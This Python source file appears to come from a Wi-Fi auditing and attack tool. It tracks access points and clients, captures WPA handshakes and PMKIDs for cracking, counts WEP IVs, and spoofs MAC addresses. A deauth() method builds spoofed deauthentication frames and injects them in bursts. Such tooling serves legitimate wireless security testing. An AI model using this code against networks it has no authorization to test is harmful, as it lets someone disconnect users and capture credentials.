"""The device-agnostic 802.11 interface (``WlanInterface``): builds the AP/client registry
from parsed RX frames, drives channel hopping, and injects raw frames via a chipset driver."""
import asyncio
import logging
import time
from typing import List, Optional, Callable, Any, Dict, Set

from wifit3.engine.models import AccessPoint, Client, Handshake, EapolFrame
from wifit3.engine.protocols import FakeMacSupport
from wifit3.wlan.channels import scan_hop_order
from wifit3.wlan.packet import WlanFrameParser
from wifit3.wlan.packet_stats import PacketStats
from wifit3.wlan.wep_store import WepCaptureStore

logger = logging.getLogger(__name__)


def _enc_rank(label: str) -> int:
    """Rank an encryption label by evidence strength: OPEN(0) < WEP(1) < WPA*(2).

    A WPA/WPA2/WPA3/OWE label means an RSN/WPA IE was parsed (a truncated beacon can't
    fabricate one); WEP/OPEN are Privacy-bit fallbacks when no IE was found. Callers keep
    the highest rank ever seen so a dropped IE can't downgrade an AP.
    """
    if label == "OPEN":
        return 0
    if label == "WEP":
        return 1
    return 2  # any IE-derived label


def _bssid_bit_diff(a: str, b: str) -> int:
    """Hamming distance between two ``aa:bb:…``-formatted BSSIDs (count of
    differing bits across all 48). Returns 48 (sentinel — fully different)
    for malformed input so callers naturally reject it from the sibling
    set."""
    pa = a.lower().split(":")
    pb = b.lower().split(":")
    if len(pa) != 6 or len(pb) != 6:
        return 48
    try:
        return sum(
            bin(int(x, 16) ^ int(y, 16)).count("1") for x, y in zip(pa, pb)
        )
    except ValueError:
        return 48


def _bssid_byte_diff(a: str, b: str) -> int:
    """Count differing bytes between two ``aa:bb:…``-formatted BSSIDs.
    Complements ``_bssid_bit_diff``: vendor schemes that deliberately
    randomize multiple bits inside a single byte (e.g. ``42 / 3c`` =
    6-bits-in-1-byte) need the byte-level branch."""
    pa = a.lower().split(":")
    pb = b.lower().split(":")
    if len(pa) != 6 or len(pb) != 6:
        return 6
    return sum(1 for x, y in zip(pa, pb) if x != y)

class WlanInterface:
    """High-level 802.11 abstraction for a hardware driver; the UI talks only to this class."""
    def __init__(self, driver_instance: Any, name: str, description: str,
                 vid: Optional[int] = None, pid: Optional[int] = None,
                 dev: Any = None):
        self.driver = driver_instance
        self.name = name
        self.description = description
        # VID:PID + raw pyusb Device, kept so the splash can probe openability and re-find
        # the card after a WinUSB install. Optional so test-built interfaces can omit them.
        self.vid = vid
        self.pid = pid
        self.dev = dev
        self.current_channel = 1

        self.access_points: Dict[str, AccessPoint] = {}
        self.clients: Dict[str, Client] = {}

        # Passive WEP IV tallying (RX-only); updates AccessPoint.wep counters.
        self.wep_store = WepCaptureStore()

        # Per-(bssid, class) frame counters for the Focus live packet dashboard.
        self.packet_stats = PacketStats()

        # MACs we forged for active attacks (e.g. PMKID harvest). Frames to these come from
        # the AP, so skip client registration + handshake EAPOL retries (PMKID still runs).
        self.forged_macs: Set[str] = set()

        # Forged STA MAC for WEP fake-auth. Unlike forged_macs these ARE registered as a
        # client, tagged is_self so the UI shows "YOU".
        self.self_macs: Set[str] = set()

        self._rx_callbacks: List[Callable[[bytes, int, float], None]] = []
        self._hopping_task: Optional[asyncio.Task] = None
        # The in-flight per-hop set_channel, tracked so stop_hopping() can drain it
        # (a tune runs in an executor thread that cancellation can't stop).
        self._tune_task: Optional[asyncio.Task] = None
        self._is_hopping = False
        # Serializes start/stop_hopping so they can't interleave — a concurrent start
        # mid-stop would orphan a hop task that ping-pongs the chip across channels.
        self._hop_lock = asyncio.Lock()

        if hasattr(self.driver, 'register_rx_callback'):
            self.driver.register_rx_callback(self._on_frame_parsed)

    def _on_frame_parsed(self, parsed: dict):
        """Mutator callback: takes the driver's parsed-frame dict and updates the registry."""
        frame_type = parsed.get("type")
        bssid = parsed.get("bssid")
        rssi = parsed.get("rssi", -100)

        # Fan out to raw-frame subscribers (e.g. WPA3DowngradeAttack) first, so they see
        # frames even when the state-update path below bails on bssid filtering.
        raw = parsed.get("raw")
        if raw is not None and self._rx_callbacks:
            self._fire_rx_callbacks(raw, rssi)

        # Debug trace of attack-relevant RX — data/EAPOL plus the AP's mgmt replies
        # (assoc-resp, auth=mgmt_11, deauth), so a whole exchange is visible: whether the AP
        # answers our auth/assoc at all, not just whether data reaches us. Beacons/probes
        # stay out as noise; control frames never reach here. Guarded so it's free when off.
        if (
            frame_type in ("data", "eapol", "wep_data", "assoc_resp", "reassoc_resp",
                           "deauth", "disassoc")
            or (isinstance(frame_type, str) and frame_type.startswith("mgmt_"))
        ) and logger.isEnabledFor(logging.DEBUG):
            logger.debug(
                "[RXFRAME] %-9s to_ds=%s from_ds=%s %s -> %s (bssid %s)",
                frame_type, parsed.get("to_ds"), parsed.get("from_ds"),
                parsed.get("source"), parsed.get("dest"), bssid,
            )

        if not bssid or bssid == "Unknown" or bssid == "ff:ff:ff:ff:ff:ff":
            return

        # Live packet dashboard — tally each RX frame against its AP by class. Best-effort.
        self.packet_stats.record_rx(bssid, frame_type)

        # We primarily build APs from beacons and probe responses
        if frame_type in ("beacon", "probe_resp"):
            ssid = parsed.get("ssid")
            channel = parsed.get("channel", self.current_channel)
            enc = parsed.get("encryption", "OPEN")
            akms = parsed.get("akms", []) or []
            akm_suites = parsed.get("akm_suites", []) or []
            pairwise_cipher = parsed.get("pairwise_cipher")
            wpa3 = parsed.get("wpa3", False)
            transition_mode = parsed.get("transition_mode", False)
            pmf_capable = parsed.get("pmf_capable", False)
            pmf_required = parsed.get("pmf_required", False)
            wps = parsed.get("wps", False)
            wps_locked = parsed.get("wps_locked", False)
            wps_version = parsed.get("wps_version")
            wps_config_methods = parsed.get("wps_config_methods", 0)
            wps_device_password_id = parsed.get("wps_device_password_id")
            wps_selected_registrar = parsed.get("wps_selected_registrar", False)

            if bssid not in self.access_points:
                self.access_points[bssid] = AccessPoint(
                    bssid=bssid,
                    ssid=ssid if ssid != "<hidden>" else None,
                    channel=channel,
                    signal=rssi,
                    encryption=enc,
                    akms=list(akms),
                    akm_suites=list(akm_suites),
                    pairwise_cipher=pairwise_cipher,
                    beacons=1 if frame_type == "beacon" else 0,
                    wpa3=wpa3,
                    transition_mode=transition_mode,
                    pmf_capable=pmf_capable,
                    pmf_required=pmf_required,
                    wps=wps,
                    wps_locked=wps_locked,
                    wps_version=wps_version,
                    wps_config_methods=wps_config_methods,
                    wps_device_password_id=wps_device_password_id,
                    wps_selected_registrar=wps_selected_registrar,
                )
                self._recompute_siblings_for(bssid)
                if ssid and ssid != "<hidden>":
                    logger.info(f"[NEW AP] Found '{ssid}' ({bssid}) on CH {channel}")
            else:
                ap = self.access_points[bssid]
                old_channel = ap.channel
                if frame_type == "beacon":
                    ap.beacons += 1

                # Decloak a hidden AP once we see its SSID; tag how (beacon vs probe_resp)
                # for the UI's decloak event.
                if ssid and ssid != "<hidden>":
                    if not ap.ssid or ap.ssid == "<hidden>":
                        ap.decloak_method = frame_type  # "beacon" or "probe_resp"
                    ap.ssid = ssid

                # Smooth RSSI (running average)
                ap.signal = (ap.signal + rssi) // 2

                # Update channel if it shifted — sibling links are
                # channel-scoped, so re-evaluate on actual moves.
                ap.channel = channel
                if old_channel != channel:
                    self._recompute_siblings_for(bssid)
                # Keep the strongest encryption evidence ever seen (see _enc_rank): apply
                # only on equal-or-higher rank, so a dropped IE can't downgrade WPA2->WEP
                # while WPA*-to-WPA* config refreshes still pass.
                if _enc_rank(enc) >= _enc_rank(ap.encryption):
                    ap.encryption = enc
                    ap.akms = list(akms)
                    ap.akm_suites = list(akm_suites)
                    ap.pairwise_cipher = pairwise_cipher
                    ap.wpa3 = wpa3
                    ap.transition_mode = transition_mode
                    ap.pmf_capable = pmf_capable
                    ap.pmf_required = pmf_required
                # Only refresh WPS when this frame carried the IE — its absence must not
                # clear a known WPS flag (but locked/state can change, so re-read if present).
                if wps:
                    ap.wps = True
                    ap.wps_locked = wps_locked
                    ap.wps_version = wps_version
                    ap.wps_config_methods = wps_config_methods
                    ap.wps_device_password_id = wps_device_password_id
                    ap.wps_selected_registrar = wps_selected_registrar

            # Bump recency — drives stale-row dim-out and "Last Beacon: Ns ago" in Focus.
            self.access_points[bssid].last_seen = time.time()

            # Stash the latest RSN IE — PMKID harvest echoes it into its Assoc Req.
            rsn_ie = parsed.get("rsn_ie_raw")
            if rsn_ie:
                self.access_points[bssid].rsn_ie = rsn_ie

        # Passive WEP capture: only for APs already classified WEP from a beacon (guards
        # against a stray ExtIV-clear frame). The store does all the routing.
        if frame_type == "wep_data" and bssid in self.access_points:
            ap = self.access_points[bssid]
            if (ap.encryption or "").upper() == "WEP":
                stats = self.wep_store.observe(bssid, parsed)
                if stats is not None and ap.wep is None:
                    ap.wep = stats

        # Client Tracking
        if frame_type in ("probe_req", "assoc_req", "reassoc_req", "data", "wep_data", "eapol", "deauth", "assoc_resp"):
            client_mac = None
            source = parsed.get("source")
            dest = parsed.get("dest")

            if frame_type == "probe_req":
                client_mac = source
            else:
                # Deduce client MAC (the one that isn't the BSSID)
                if source and source != bssid:
                    client_mac = source
                elif dest and dest != bssid:
                    client_mac = dest

            if client_mac and client_mac != "ff:ff:ff:ff:ff:ff" and client_mac not in self.forged_macs:
                if client_mac not in self.clients:
                    self.clients[client_mac] = Client(
                        mac=client_mac,
                        signal=rssi,
                        is_self=client_mac in self.self_macs,
                    )
                client = self.clients[client_mac]
                client.signal = (client.signal + rssi) // 2
                client.packets += 1

                # The client's chosen AKM, from its (Re)Assoc Request RSN IE.
                assoc_akm = parsed.get("assoc_akm")
                if assoc_akm is not None:
                    client.akm_selected = assoc_akm

                # Track association
                if frame_type in ("assoc_req", "reassoc_req", "data", "wep_data", "eapol"):
                    if bssid:
                        client.bssid = bssid

                # Track probed SSIDs
                if frame_type == "probe_req":
                    ssid = parsed.get("ssid")
                    if ssid and ssid != "<hidden>":
                        client.probed_ssids.add(ssid)

                # Decloak via Assoc Req
                if frame_type == "assoc_req" and bssid in self.access_points:
                    ssid = parsed.get("ssid")
                    if ssid and ssid != "<hidden>":
                        ap = self.access_points[bssid]
                        if not ap.ssid or ap.ssid == "<hidden>":
                            ap.decloak_method = "assoc_req"
                            ap.ssid = ssid

        # Handshake tracking — per-client, never wiped.
        if frame_type == "eapol" and bssid in self.access_points:
            client_mac = parsed.get("source") if parsed.get("dest") == bssid else parsed.get("dest")
            raw_frame = parsed.get("raw")
            replay = parsed.get("eapol_replay_counter")
            if client_mac and raw_frame and replay:
                ap = self.access_points[bssid]
                hs = ap.handshakes.get(client_mac)
                if hs is None:
                    hs = Handshake(
                        bssid=bssid,
                        client_mac=client_mac,
                        beacon_frame=ap.last_beacon_frame,
                        akm_offered=list(ap.akm_suites),
                    )
                    ap.handshakes[client_mac] = hs
                elif ap.akm_suites:
                    # Refresh in case the handshake was created before the AP's
                    # RSN IE was known (EAPOL can precede the first beacon).
                    hs.akm_offered = list(ap.akm_suites)

                # Forged MACs keep a Handshake (for PMKID) but skip the EAPOL list — those
                # are just AP retries of M1 we never answer, and would show a false "Partial".
                is_forged = client_mac in self.forged_macs
                if not is_forged and not hs.has_frame(raw_frame):
                    eapol = EapolFrame(
                        raw=raw_frame,
                        msg_num=parsed.get("eapol_msg_num", 0),
                        replay_hex=replay.hex(),
                        nonce=parsed.get("eapol_nonce", b""),
                        mic=parsed.get("eapol_mic", b""),
                        key_data_len=parsed.get("eapol_key_data_len", 0),
                        eapol_payload=parsed.get("eapol_payload", b""),
                        timestamp=time.time(),
                    )
                    hs.eapol_frames.append(eapol)
                    msg_label = f"M{eapol.msg_num}" if eapol.msg_num else "EAPOL-?"
                    logger.info(
                        f"[{msg_label}] {bssid} <-> {client_mac} "
                        f"(replay {eapol.replay_hex})"
                    )

                # Client's negotiated AKM, read from M2's cleartext RSN IE. This is
                # the authoritative per-association crackability signal (SAE vs PSK)
                # on a WPA2/WPA3 transition AP. Latest M2 wins.
                akm = parsed.get("eapol_akm")
                if akm is not None:
                    hs.akm_client = akm
                elif hs.akm_client is None:
                    # No M2 yet (e.g. a PMKID-only capture) — fall back to the AKM
                    # the client advertised in its (Re)Assoc Request.
                    client_obj = self.clients.get(client_mac)
                    if client_obj is not None and client_obj.akm_selected is not None:
                        hs.akm_client = client_obj.akm_selected

                # Passive PMKID capture: AP's M1 sometimes carries a PMKID KDE. First wins.
                pmkid = parsed.get("eapol_pmkid")
                if pmkid and not hs.pmkid:
                    hs.pmkid = pmkid
                    logger.info(
                        f"[PMKID] {bssid} <-> {client_mac} captured {pmkid.hex()}"
                    )

        # Stash the latest beacon and back-fill handshakes missing one (EAPOL can arrive
        # before the first beacon).
        if frame_type == "beacon" and bssid in self.access_points:
            ap = self.access_points[bssid]
            raw_beacon = parsed.get("raw")
            if raw_beacon:
                ap.last_beacon_frame = raw_beacon
                for hs in ap.handshakes.values():
                    if not hs.beacon_frame:
                        hs.beacon_frame = raw_beacon
                    if ap.akm_suites and not hs.akm_offered:
                        hs.akm_offered = list(ap.akm_suites)

    SIBLING_BIT_DIFF_MAX = 4

    def _recompute_siblings_for(self, bssid: str) -> None:
        """Refresh sibling links for ``bssid`` against the whole registry.

        Sibling rule: same channel AND (Hamming distance <= 4 bits OR exactly one byte
        differs) — the two branches catch the two vendor multi-BSSID schemes (scattered
        single-bit flips vs. one deliberately-randomized byte). Links are bidirectional;
        called when an AP is added or changes channel.
        """
        ap = self.access_points.get(bssid)
        if not ap:
            return
        new_siblings: List[str] = []
        for other_bssid, other_ap in self.access_points.items():
            if other_bssid == bssid:
                continue
            same_channel = other_ap.channel == ap.channel
            bit_d = _bssid_bit_diff(bssid, other_bssid)
            byte_d = _bssid_byte_diff(bssid, other_bssid)
            is_sibling = (
                same_channel
                and bit_d > 0
                and (bit_d <= self.SIBLING_BIT_DIFF_MAX or byte_d == 1)
            )
            if is_sibling:
                new_siblings.append(other_bssid)
                if bssid not in other_ap.siblings:
                    other_ap.siblings.append(bssid)
            else:
                # Channel mismatch or too divergent — drop any stale link.
                if bssid in other_ap.siblings:
                    other_ap.siblings.remove(bssid)
        ap.siblings = new_siblings

    def get_access_points(self) -> List[AccessPoint]:
        """Returns a list of discovered Access Points."""
        return list(self.access_points.values())

    async def connect(self, progress_cb: Optional[Callable[[float, str], None]] = None) -> bool:
        """Initializes the underlying hardware handshake."""
        return await self.driver.connect(progress_cb=progress_cb)

    async def set_channel(self, channel: int, scan: bool = False) -> bool:
        """Tune to ``channel`` via the driver. ``scan=True`` (channel hopper) hints a
        transient hop so the driver may skip per-hop calibration; Focus passes False for a
        full tune."""
        success = await self.driver.set_channel(channel, scan=scan)
        if success:
            self.current_channel = channel
        return success

    def register_forged_mac(self, mac: Any) -> None:
        """Mark ``mac`` as one we forged for an active attack. Accepts bytes
        (6 B) or a colon-separated string. Idempotent."""
        if isinstance(mac, bytes):
            mac_str = ":".join(f"{b:02x}" for b in mac)
        else:
            mac_str = str(mac).lower()
        self.forged_macs.add(mac_str)

    async def set_fake_mac(self, mac: Any, bssid: Any = None) -> Optional[str]:
        """Ask the driver to HW-ACK frames addressed to ``mac`` (active-monitor) — the
        prerequisite for an ACKed conversation (WPS/EAP). ``bssid`` is the peer AP
        (firmware-offload radios only). Also registers the MAC as forged. Accepts bytes
        or a colon-string. Returns the MAC armed, or None if the card can't spoof one
        (FakeMacSupport.NONE / absent); a FIXED_MAC card returns its own MAC."""
        support = getattr(self.driver, "FAKE_MAC", FakeMacSupport.UNIMPLEMENTED)
        unavailable = support in (FakeMacSupport.NONE, FakeMacSupport.UNIMPLEMENTED)
        if unavailable or not hasattr(self.driver, "enter_active_monitor"):
            logger.info("set_fake_mac: %s (%s) — active-monitor unavailable (%s)",
                        self.name, self._chipset, support.value)
            return None
        mac_b = self._to_mac_bytes(mac)
        bssid_b = self._to_mac_bytes(bssid) if bssid is not None else None
        assumed = await self.driver.enter_active_monitor(mac_b, bssid_b)
        self.register_forged_mac(assumed)
        assumed_str = ":".join(f"{b:02x}" for b in assumed)
        logger.info("[FAKEMAC] %s (%s) now HW-ACKing %s", self.name, self._chipset, assumed_str)
        return assumed_str

    async def clear_fake_mac(self) -> None:
        """Inverse of set_fake_mac: stop HW-ACKing the forged MAC, restore plain
        monitor. Idempotent and safe on drivers without the capability."""
        if hasattr(self.driver, "exit_active_monitor"):
            await self.driver.exit_active_monitor()
            logger.info("[FAKEMAC] %s (%s) restored plain monitor", self.name, self._chipset)

    @staticmethod
    def _to_mac_bytes(mac: Any) -> bytes:
        """Coerce a MAC given as 6 raw bytes or a colon-separated string to bytes."""
        if isinstance(mac, bytes):
            return mac
        return bytes(int(x, 16) for x in str(mac).split(":"))

    @property
    def _chipset(self) -> str:
        """The chips/<name> dir of the active driver — for driver-specific log lines."""
        parts = type(self.driver).__module__.split(".")
        return parts[-2] if len(parts) >= 2 else parts[-1]

    def active_monitor_warning(self) -> Optional[str]:
        """Treelog warning (rich markup) if this card can't HW-ACK a spoofed MAC, else None.
        WPS still runs — un-ACKed, so expect timeouts/retries. NONE = the silicon can't
        (hard MAC); UNIMPLEMENTED = this driver didn't port active-monitor."""
        support = getattr(self.driver, "FAKE_MAC", FakeMacSupport.UNIMPLEMENTED)
        if support in (FakeMacSupport.SPOOFABLE, FakeMacSupport.FIXED_MAC):
            return None
        reason = "not possible (hard-MAC)" if support is FakeMacSupport.NONE else "not implemented"
        return (f"⚠  [orange1][bold]Active Monitor[/bold] {reason} "
                f"for [bold]{self._chipset}[/bold][/orange1]")

    def active_monitor_status(self) -> FakeMacSupport:
        """The current driver's active-monitor capability, for UX gating (e.g. the WPS-PIN
        confirm modal). Undeclared drivers default to UNIMPLEMENTED."""
        return getattr(self.driver, "FAKE_MAC", FakeMacSupport.UNIMPLEMENTED)

    def register_self_mac(self, mac: Any, bssid: Optional[str] = None) -> str:
        """Mark ``mac`` as our own forged STA and surface it in the client
        table tagged ``is_self`` (rendered "YOU"). Accepts bytes or a string;
        returns the colon-string form. Pre-creates the Client so YOU appears
        the instant fake-auth starts, before any AP reply arrives."""
        if isinstance(mac, bytes):
            mac_str = ":".join(f"{b:02x}" for b in mac)
        else:
            mac_str = str(mac).lower()
        self.self_macs.add(mac_str)
        client = self.clients.get(mac_str)
        if client is None:
            self.clients[mac_str] = Client(
                mac=mac_str, bssid=bssid, is_self=True
            )
        else:
            client.is_self = True
            if bssid:
                client.bssid = bssid
        return mac_str

    def unregister_self_mac(self, mac: Any) -> None:
        """Inverse of register_self_mac — drops the YOU client. Idempotent."""
        if isinstance(mac, bytes):
            mac_str = ":".join(f"{b:02x}" for b in mac)
        else:
            mac_str = str(mac).lower()
        self.self_macs.discard(mac_str)
        self.clients.pop(mac_str, None)

    def register_rx_callback(self, callback_func: Callable[[bytes, int, float], None]):
        """Register a raw-frame subscriber: func(frame_bytes, rssi, timestamp)."""
        if callback_func not in self._rx_callbacks:
            self._rx_callbacks.append(callback_func)

    def unregister_rx_callback(self, callback_func: Callable[[bytes, int, float], None]):
        """Idempotent inverse of register_rx_callback."""
        if callback_func in self._rx_callbacks:
            self._rx_callbacks.remove(callback_func)

    def _fire_rx_callbacks(self, frame_bytes: bytes, rssi: int):
        ts = time.time()
        for cb in self._rx_callbacks:
            try:
                cb(frame_bytes, rssi, ts)
            except Exception as e:
                logger.error(f"RX Callback failed: {e}")

    async def send_raw(
        self, frame_bytes: bytes, use_no_ack: bool = True,
    ) -> bool:
        """Inject a raw 802.11 frame. The driver wraps it in the hardware TX descriptors."""
        if hasattr(self.driver, 'inject_frame'):
            # Live packet dashboard — tally this inject (deauth vs other) by AP.
            self._record_tx(frame_bytes)
            return await self.driver.inject_frame(frame_bytes, use_no_ack)
        logger.warning(f"Driver for {self.name} does not support injection.")
        return False

    def _record_tx(self, frame_bytes: bytes) -> None:
        """Classify an outgoing frame for the packet dashboard (deauth vs other), reusing
        the RX parser. Wrapped so a malformed inject can't break TX over a cosmetic counter."""
        try:
            parsed = WlanFrameParser.parse_80211_frame(frame_bytes, 0)
            if not parsed:
                return
            # Mirror of [RXFRAME] for our injects — reappearing as RX would mean chip loopback.
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(
                    "[TXFRAME] %-9s to_ds=%s from_ds=%s %s -> %s (bssid %s)",
                    parsed.get("type"), parsed.get("to_ds"), parsed.get("from_ds"),
                    parsed.get("source"), parsed.get("dest"), parsed.get("bssid"),
                )
            bssid = parsed.get("bssid")
            if bssid and bssid not in ("Unknown", "ff:ff:ff:ff:ff:ff"):
                self.packet_stats.record_tx(bssid, parsed.get("type") == "deauth")
        except Exception:
            pass

    async def deauth(self, ap_bssid: str, client_bssid: str, burst_count: int = 10):
        """Inject a burst of deauth frames spoofing both directions (AP→client and client→AP)."""
        ap_bssid = ap_bssid.lower()
        client_bssid = client_bssid.lower()

        target_chan = self.current_channel
        if ap_bssid in self.access_points:
            target_chan = self.access_points[ap_bssid].channel
        else:
            logger.debug("[DEAUTH] %s not in registry; deauthing on current channel %d",
                         ap_bssid, target_chan)

        ap_mac = self._to_mac_bytes(ap_bssid)
        cl_mac = self._to_mac_bytes(client_bssid)

        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00. Duration 0 (hardware fills).
        # Reason Code 7 (class-3 frame from nonassociated STA), little-endian u16.
        fc_dur = b"\xc0\x00\x00\x00"
        reason = b"\x07\x00"
        seq = b"\x00\x00"  # hardware overwrites the sequence number

        # Client deauth spoofs the AP as source; AP deauth spoofs the client.
        # Addr1=Dest, Addr2=Source, Addr3=BSSID(AP) in both.
        client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason
        ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason

        logger.info(f"Injecting Deauth Burst ({burst_count}x) on CH {target_chan}: "
                    f"{ap_bssid} <-> {client_bssid}")

        # use_no_ack: we're spoofing, so ACKs would go to the real targets and trigger
        # endless hardware retries.
        for _ in range(burst_count):
            await self.send_raw(client_deauth, use_no_ack=True)
            await self.send_raw(ap_deauth, use_no_ack=True)
            await asyncio.sleep(0.01)


    async def start_hopping(self, channels: List[int] = None, interval: float = 0.5):
        """Spawns an asyncio task to loop through channels.

        If `channels` is omitted, uses the driver's `SUPPORTED_CHANNELS`
        capability. Falls back to the canonical 2.4 GHz set for drivers
        that pre-date the capability declaration.
        """
        async with self._hop_lock:
            if self._is_hopping:
                return

            if not channels:
                channels = getattr(self.driver, "SUPPORTED_CHANNELS", None)
                if not channels:
                    channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]

            # Hop busy channels (1/6/11) first so the AP list fills before the scanner's
            # first sort tick. SUPPORTED_CHANNELS stays sequential for the filter UI.
            channels = scan_hop_order(channels)

            self._is_hopping = True
            self._hopping_task = asyncio.create_task(self._hop_loop(channels, interval))
            logger.info(
                "Started channel hopping on %s across %d channel(s) every %.2fs",
                self.name, len(channels), interval,
            )

    async def _hop_loop(self, channels: List[int], interval: float):
        import itertools
        channel_cycle = itertools.cycle(channels)
        last_channel = None
        while self._is_hopping:
            channel = next(channel_cycle)
            # Skip re-tuning the channel we're already on — each tune briefly blanks the
            # radio (PLL relock), dropping frames. Matters most with a single-channel filter.
            if channel != last_channel:
                # Shield the tune: its executor thread can't be cancelled, so an unshielded
                # mid-tune stop_hopping() would let it finish and land the chip on a stale
                # channel. stop_hopping drains self._tune_task instead.
                self._tune_task = asyncio.ensure_future(
                    self.set_channel(channel, scan=True)
                )
                await asyncio.shield(self._tune_task)
                last_channel = channel
            await asyncio.sleep(interval)

    async def stop_hopping(self):
        """Cancel the hopping task, then drain any in-flight tune.

        Cancelling the loop can't stop the executor thread running a mid-flight tune, so we
        await self._tune_task afterward — otherwise that orphan moves the chip off the
        channel Focus is about to pin.
        """
        async with self._hop_lock:
            task = self._hopping_task
            # Clear state FIRST so a start_hopping blocked on _hop_lock sees a clean slate.
            self._is_hopping = False
            self._hopping_task = None
            if task:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            # Drain the shielded tune the cancel interrupted (its executor thread runs on).
            tune = self._tune_task
            self._tune_task = None
            if tune is not None and not tune.done():
                try:
                    await tune
                except Exception:
                    pass
            logger.info(f"Stopped channel hopping on {self.name}")

    async def close(self):
        """Halts the driver loops and releases the USB interface."""
        await self.stop_hopping()
        await self.driver.close()